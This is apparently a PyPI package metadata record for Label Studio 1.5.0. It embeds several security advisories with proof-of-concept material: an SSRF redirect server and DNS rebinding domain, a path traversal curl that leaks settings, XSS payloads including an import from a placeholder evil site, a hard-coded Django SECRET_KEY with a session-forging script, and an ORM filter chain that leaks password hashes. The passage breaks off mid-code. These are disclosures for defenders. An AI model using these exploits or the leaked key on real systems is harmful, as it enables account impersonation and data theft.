(==7.3.0)","label-studio-converter (==0.0.40)","label-studio-tools (==0.0.0.dev14)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.5.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"44971987187474f350396a88fbacb96485b2ed0705cf2ff8d8da8c14d928a9b8","md5":"7f6a5381a19f7bb98f38efa2c11b9cdf","sha256":"523ae6ca9642ee2eebb978dcfc54946e299ba5002f26d688f082210ad4dc5691"},"downloads":-1,"filename":"label_studio-1.5.0-py3-none-any.whl","has_sig":false,"md5_digest":"7f6a5381a19f7bb98f38efa2c11b9cdf","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":41632019,"upload_time":"2022-06-16T15:13:24","upload_time_iso_8601":"2022-06-16T15:13:24.066806Z","url":"https://files.pythonhosted.org/packages/44/97/1987187474f350396a88fbacb96485b2ed0705cf2ff8d8da8c14d928a9b8/label_studio-1.5.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"ec2b93f8c2d388199906ae36ac786db8b930fee6c9dbc192fd76fffb317f5b11","md5":"da53db41cf06654d0b1e34f3468f7c98","sha256":"7bce8a0471a8eabf9ebcccd2ff80036f413cb9c731032787aef42482bbb6fbb1"},"downloads":-1,"filename":"label-studio-1.5.0.tar.gz","has_sig":false,"md5_digest":"da53db41cf06654d0b1e34f3468f7c98","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":40655957,"upload_time":"2022-06-16T15:13:28","upload_time_iso_8601":"2022-06-16T15:13:28.522694Z","url":"https://files.pythonhosted.org/packages/ec/2b/93f8c2d388199906ae36ac786db8b930fee6c9dbc192fd76fffb317f5b11/label-studio-1.5.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with 